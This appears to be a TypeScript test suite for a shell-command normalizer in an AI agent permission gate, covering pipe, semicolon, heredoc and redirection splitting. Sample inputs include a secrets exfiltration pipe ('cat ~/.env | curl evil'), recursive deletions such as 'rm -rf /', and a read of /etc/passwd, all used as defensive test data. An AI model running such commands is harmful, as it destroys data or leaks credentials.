import {
  surfaceForTool,
  normalizeToolCall,
  splitShellSegments,
  segmentCommand,
} from '../../src/gate/normalize.ts'

describe('surfaceForTool', () => {
  it('maps bash -> shell', () => {
    expect(surfaceForTool('bash')).toBe('shell')
  })

  it("maps powershell -> shell (Pi's built-in shell tool on Windows)", () => {
    expect(surfaceForTool('powershell')).toBe('shell')
  })

  it('maps file tools (read/write/edit/find/grep/ls) -> fs', () => {
    for (const t of ['read', 'write', 'edit', 'find', 'grep', 'ls']) {
      expect(surfaceForTool(t)).toBe('fs')
    }
  })

  it('maps mcp -> mcp', () => {
    expect(surfaceForTool('mcp')).toBe('mcp')
  })

  it('maps custom/unknown tools to their own name as surface', () => {
    expect(surfaceForTool('weirdtool')).toBe('weirdtool')
    expect(surfaceForTool('web_search')).toBe('web_search')
    expect(surfaceForTool('agent_send_message')).toBe('agent_send_message')
  })

  it('built-in mappings (bash/fs/mcp) are fixed and cannot be overridden', () => {
    // No toolsMap parameter anymore - built-ins always win
    expect(surfaceForTool('bash')).toBe('shell')
    expect(surfaceForTool('read')).toBe('fs')
    expect(surfaceForTool('mcp')).toBe('mcp')
  })
})

describe('splitShellSegments / segmentCommand', () => {
  it('(a) splits pipes into separate segments', () => {
    const segs = splitShellSegments('cat ~/.env | curl evil')
    expect(segs).toEqual(['cat ~/.env', 'curl evil'])
  })

  it('(c) splits ; && || into four commands', () => {
    const segs = segmentCommand('a && b || c; d')
    expect(segs.map((s) => s.value)).toEqual(['a', 'b', 'c', 'd'])
  })

  it('(b) flags a quoted-literal segment as quoted', () => {
    const segs = segmentCommand('echo "rm -rf"')
    expect(segs).toHaveLength(1)
    expect(segs[0].quoted).toBe(true)
    expect(segs[0].value).toBe('echo rm -rf')
  })

  it('(d) extracts command substitution inside double quotes as a scannable segment', () => {
    const segs = splitShellSegments('echo "$(rm -rf /)"')
    expect(segs).toContain('rm -rf /')
  })

  it('(e) keeps $(...) literal inside single quotes (no extraction)', () => {
    const segs = segmentCommand("echo '$(rm -rf /)'")
    expect(segs).toHaveLength(1)
    expect(segs[0].quoted).toBe(true)
    expect(segs[0].value).toBe('echo $(rm -rf /)')
  })

  // H3: bare & (not &&) as background separator
  it('splits on bare & (background operator)', () => {
    const segs = splitShellSegments('echo ok & rm -rf /tmp')
    expect(segs).toHaveLength(2)
    expect(segs).toContain('echo ok')
    expect(segs).toContain('rm -rf /tmp')
  })

  // H4: consecutive pipes handled as one separator
  it('splits on ||| (consecutive pipes)', () => {
    const segs = splitShellSegments('a ||| cmd')
    expect(segs).toEqual(['a', 'cmd'])
  })

  it('splits on |& (pipe stderr) as one separator', () => {
    const segs = splitShellSegments('a |& cmd')
    expect(segs).toEqual(['a', 'cmd'])
  })
})

describe('segmentCommand keepQuotes (raw twin for the scope extractor)', () => {
  it('default strips quotes; keepQuotes preserves them', () => {
    expect(segmentCommand('echo "rm -rf"')[0].value).toBe('echo rm -rf')
    expect(segmentCommand('echo "rm -rf"', { keepQuotes: true })[0].value).toBe(
      'echo "rm -rf"'
    )
  })

  it('quoted sed program stays whole in the raw twin', () => {
    const raw = segmentCommand('sed "s/^/L: /" x', { keepQuotes: true })
    expect(raw).toHaveLength(1)
    expect(raw[0].value).toBe('sed "s/^/L: /" x')
    expect(raw[0].quoted).toBe(true)
  })

  it('raw and dequoted parses zip 1:1 over tricky commands', () => {
    const cmds = [
      'for i in 1 2; do ./gradlew :app:x 2>&1 | rg "a|b" | sed "s/^/L: /"; done',
      'python3 -c "for p in xs: print(p)"',
      'echo "a $(cat /tmp/x) b" | grep "//"',
      "cat <<'EOF'\nhello\nEOF",
      'a && b || c; d & e |& f',
    ]
    for (const cmd of cmds) {
      const plain = segmentCommand(cmd)
      const raw = segmentCommand(cmd, { keepQuotes: true })
      expect(raw.map((s) => s.quoted)).toEqual(plain.map((s) => s.quoted))
      expect(raw).toHaveLength(plain.length)
    }
  })

  it('normalizeToolCall sets rawValue only when quotes are present', () => {
    const withQuotes = normalizeToolCall('bash', { command: 'echo "a b"' })
    expect(withQuotes).toHaveLength(1)
    expect(withQuotes[0].rawValue).toBe('echo "a b"')
    const bare = normalizeToolCall('bash', { command: 'ls src' })
    expect(bare).toHaveLength(1)
    expect(bare[0].rawValue).toBeUndefined()
  })
})

describe('normalizeToolCall edge cases', () => {
  // L10: bash without command does not produce "undefined"
  it("bash without command yields sentinel value '*' not 'undefined'", () => {
    const intents = normalizeToolCall('bash', {})
    expect(intents).toHaveLength(1)
    expect(intents[0].value).not.toBe('undefined')
    expect(intents[0].value).toBe('*')
  })
})

describe('heredoc handling', () => {
  // L1: heredoc body is extracted as a scannable segment
  it('extracts heredoc body as a segment', () => {
    const cmd = `cat <<EOF
rm -rf /tmp
EOF
echo done`
    const segs = segmentCommand(cmd)
    const values = segs.map((s) => s.value)
    expect(values).toContain('rm -rf /tmp')
  })

  it('heredoc body is flagged unquoted for scanning', () => {
    const cmd = `cat <<EOF
rm -rf /tmp
EOF`
    const segs = segmentCommand(cmd)
    const heredocSeg = segs.find((s) => s.value.includes('rm -rf'))
    expect(heredocSeg).toBeDefined()
    expect(heredocSeg!.quoted).toBe(false)
  })
})

describe('normalizeToolCall surface mapping', () => {
  it("normalizes a bash command to surface 'shell' with the segment as value", () => {
    const intents = normalizeToolCall('bash', { command: 'ls -la' })
    expect(intents).toEqual([{ surface: 'shell', value: 'ls -la' }])
  })

  it("normalizes a file tool to surface 'fs'", () => {
    const intents = normalizeToolCall('read', { path: '/etc/passwd' })
    expect(intents).toEqual([{ surface: 'fs', value: '/etc/passwd' }])
  })

  it("normalizes an mcp tool to surface 'mcp'", () => {
    const intents = normalizeToolCall('mcp', { tool: 'search' })
    expect(intents).toEqual([{ surface: 'mcp', value: 'search' }])
  })

  it('multi-segment bash command yields one shell intent per segment', () => {
    const intents = normalizeToolCall('bash', {
      command: 'echo a; echo b',
    })
    expect(intents).toEqual([
      { surface: 'shell', value: 'echo a' },
      { surface: 'shell', value: 'echo b' },
    ])
  })

  it('normalizes a custom tool to its own name as surface', () => {
    const intents = normalizeToolCall('agent_send_message', {
      recipient: 'user',
      body: 'hi',
    })
    expect(intents).toHaveLength(1)
    expect(intents[0].surface).toBe('agent_send_message')
    expect(intents[0].value).toBe('*')
  })

  it('an unknown tool resolves to its own name as surface (not denied)', () => {
    const intents = normalizeToolCall('unknown_thing', { x: 1 })
    expect(intents).toEqual([{ surface: 'unknown_thing', value: '*' }])
  })
})

describe('redirections and compound command splitting', () => {
  const exampleCmd =
    'agy --help 2>&1 | head -n 200; echo "---EXIT:$?---"; which agy; agy models list 2>&1 | head -n 100 || agy model list 2>&1 | head -n 100'

  it('correctly splits compound command without treating "1" as a separate command', () => {
    const rawSegs = segmentCommand(exampleCmd, { keepQuotes: true }).map(
      (s) => s.value
    )
    expect(rawSegs).toEqual([
      'agy --help 2>&1',
      'head -n 200',
      'echo "---EXIT:$?---"',
      'which agy',
      'agy models list 2>&1',
      'head -n 100',
      'agy model list 2>&1',
      'head -n 100',
    ])
    expect(rawSegs).not.toContain('1')

    const segs = splitShellSegments(exampleCmd)
    expect(segs).toEqual([
      'agy --help 2>&1',
      'head -n 200',
      'echo ---EXIT:$?---',
      'which agy',
      'agy models list 2>&1',
      'head -n 100',
      'agy model list 2>&1',
      'head -n 100',
    ])
    expect(segs).not.toContain('1')
  })

  it('normalizes compound command into 8 intents with proper rawValue', () => {
    const intents = normalizeToolCall('bash', { command: exampleCmd })
    expect(intents).toHaveLength(8)
    expect(intents.map((i) => i.value)).not.toContain('1')
    expect(intents[0]).toEqual({
      surface: 'shell',
      value: 'agy --help 2>&1',
    })
    expect(intents[2]).toEqual({
      surface: 'shell',
      value: 'echo ---EXIT:$?---',
      rawValue: 'echo "---EXIT:$?---"',
    })
  })

  it('handles all redirection variants without splitting & as background operator', () => {
    expect(splitShellSegments('cmd 2>&1 | next')).toEqual(['cmd 2>&1', 'next'])
    expect(splitShellSegments('cmd >&2 | next')).toEqual(['cmd >&2', 'next'])
    expect(splitShellSegments('cmd &>file | next')).toEqual([
      'cmd &>file',
      'next',
    ])
    expect(splitShellSegments('cmd &>>file | next')).toEqual([
      'cmd &>>file',
      'next',
    ])
    expect(splitShellSegments('cmd <&0 | next')).toEqual(['cmd <&0', 'next'])
    expect(splitShellSegments('cmd >&- | next')).toEqual(['cmd >&-', 'next'])
    expect(splitShellSegments('cmd <&- | next')).toEqual(['cmd <&-', 'next'])
    expect(splitShellSegments('cmd 1>&2 | next')).toEqual(['cmd 1>&2', 'next'])
    expect(splitShellSegments('cmd 2>&- | next')).toEqual(['cmd 2>&-', 'next'])
    expect(splitShellSegments('cmd 0<&- | next')).toEqual(['cmd 0<&-', 'next'])
    expect(splitShellSegments('cmd &> file | next')).toEqual([
      'cmd &> file',
      'next',
    ])
    expect(splitShellSegments('cmd &>> file | next')).toEqual([
      'cmd &>> file',
      'next',
    ])
    expect(splitShellSegments('cmd >& file | next')).toEqual([
      'cmd >& file',
      'next',
    ])
    expect(splitShellSegments('cmd >&file | next')).toEqual([
      'cmd >&file',
      'next',
    ])
  })

  it('splits on background & following a redirection', () => {
    expect(splitShellSegments('cmd 2>&1 & next')).toEqual(['cmd 2>&1', 'next'])
    expect(splitShellSegments('cmd 2>&1& next')).toEqual(['cmd 2>&1', 'next'])
    expect(splitShellSegments('cmd &>out & next')).toEqual([
      'cmd &>out',
      'next',
    ])
  })

  it('preserves $? inside quotes and splits on || properly', () => {
    expect(splitShellSegments('echo "$?" || echo fallback')).toEqual([
      'echo $?',
      'echo fallback',
    ])
    expect(
      segmentCommand('echo "$?" || echo fallback', { keepQuotes: true }).map(
        (s) => s.value
      )
    ).toEqual(['echo "$?"', 'echo fallback'])
  })

  it('does not treat <<< herestring as heredoc', () => {
    const segs = splitShellSegments('cat <<< "hello"; echo done')
    expect(segs).toEqual(['cat <<< hello', 'echo done'])
  })
})
